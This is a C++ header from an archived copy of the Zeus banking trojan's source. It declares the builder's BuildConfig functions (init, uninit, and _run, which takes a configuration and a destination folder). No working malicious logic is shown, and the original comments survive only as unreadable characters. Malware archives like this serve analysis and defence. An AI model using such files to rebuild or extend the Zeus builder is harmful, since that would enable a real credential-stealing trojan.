/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ ������������ ����.
*/
#pragma once

#include "..\common\config0.h"

namespace BuildConfig
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*    Run the build configuration.

    IN owner - osnvonoe window.
    IN output - a window to display status.
    IN config - koniguratsiya.
    IN destFolder - destination folder for the destination file.

    Return - true - if successful,
                    false - if an error occurs.
  */
  bool _run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR destFolder);
};
